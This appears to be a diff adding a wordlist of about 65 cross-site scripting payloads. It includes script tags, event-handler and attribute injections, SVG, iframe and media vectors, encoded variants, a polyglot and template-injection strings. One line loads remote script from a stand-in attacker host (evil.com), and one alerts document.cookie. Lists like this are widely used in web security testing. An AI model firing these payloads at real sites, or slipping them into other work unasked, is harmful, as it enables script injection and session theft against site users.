@@ -1,0 +1,65 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script src=//evil.com/xss.js></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onclick="alert(1)
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=alert('XSS')>
+"><img/src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//>
+<img src=1 onerror=alert(1)>
+<img/src/onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert`1`>
+<svg/onload=alert`1`>
+<svg onload=confirm(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe onload=alert(1)>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=x>">
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</telerik/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<a href="javascript:alert(1)">click</a>
+<a href="jAvAsCrIpT:alert(1)">click</a>
+javascript:alert(1)//
+'-alert(1)-'
+"-alert(1)-"
+<script>alert`1`</script>
+<script>alert\`1\`</script>
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+<script>onerror=alert;throw 1</script>
+<x contenteditable onblur=alert(1)>lose focus!
+<div onpointerover=alert(1)>MOVE HERE</div>
+<form><button formaction=javascript:alert(1)>XSS</button>
+</script><script>alert(1)</script>
+';alert(1)//
+";alert(1)//
